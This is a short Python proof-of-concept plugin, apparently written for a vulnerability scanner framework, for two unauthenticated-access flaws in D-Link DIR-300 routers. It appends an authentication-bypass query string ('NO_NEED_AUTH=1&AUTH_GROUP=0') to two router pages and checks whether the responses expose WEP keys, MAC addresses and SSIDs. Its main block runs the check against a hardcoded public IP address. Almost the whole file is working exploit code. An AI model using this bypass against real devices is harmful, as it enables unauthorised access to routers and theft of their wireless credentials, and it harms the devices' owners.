#!/usr/bin/env python
# -*- coding: utf-8 -*-
import urlparse
import time
import re

"""
POC Name  :  D-Link DIR-300 2处未授权访问
Author    :  a
mail      :  a@lcx.cc
Referer   :  http://www.wooyun.org/bugs/wooyun-2010-066799
"""

def assign(service, arg):
    if service == 'd-link':
        arr = urlparse.urlparse(arg)
        return True, '%s://%s/' % (arr.scheme, arr.netloc)

def audit(arg):
    
    payload = (
        'bsc_wlan.php?NO_NEED_AUTH=1&AUTH_GROUP=0',
        'st_device.php?NO_NEED_AUTH=1&AUTH_GROUP=0'
        )
    url1 = arg + payload[0]
    
    code, head,res, errcode, _ = curl.curl2(url1)
    if  code==200 and 'Wi-Fi Protected' in res and 'WEP Key' in res:
        security_hole(url1)

    url2 = arg + payload[1]
    code, head,res, errcode, _ = curl.curl2(url2)
    if  code==200 and 'MAC' in res and 'SSID' in res:
        security_hole(url2)


if __name__ == '__main__':
    from dummy import *
    audit(assign('d-link', 'http://222.121.54.176/')[1])